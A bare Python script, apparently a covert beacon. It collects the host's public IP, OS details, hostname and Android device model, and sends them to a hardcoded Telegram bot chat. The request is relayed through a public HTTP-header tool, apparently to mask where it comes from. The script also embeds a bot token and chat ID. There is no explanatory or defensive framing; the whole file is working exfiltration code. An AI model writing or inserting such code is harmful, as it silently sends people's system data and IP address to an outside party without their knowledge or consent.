import requests
import os
import platform
import subprocess
report = requests.get("https://api.ipify.org/").text

sys = platform.platform()
node = platform.node()
relase = platform.release()
virsion = platform.version()
machin = platform.machine()
processer = platform.processor()
system = platform.system()

def get_device_model():
    try:
        model = subprocess.check_output("getprop ro.product.model", shell=True).decode('utf-8').strip()
        return model
    except Exception as e:
        return f"Error: {str(e)}"

device_model = get_device_model()

etrur = {
    "sys":system,
    "system":sys,
    "node":node,
    "release":relase,
    "version":virsion,
    "machine":machin,
    "processor":processer,
    "model": device_model,

}
message = (
    "system : "+system,
    "name : "+sys,
    "node : "+node,
    "release : "+relase,
    "ip : "+report
)


url = ("https://api.telegram.org/bot7272002757:AAFvSte6VV1uCCKya7T2cp7FyLflykewv7w/sendmessage?chat_id=7643723650&text="+str(message))

pyload = {"UrlBox": url,
    "AgentList": "Mozila Firefox",
    "VersionsList": "HTTP/1.1",
    "MethodList": "GET"
}
requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx", pyload)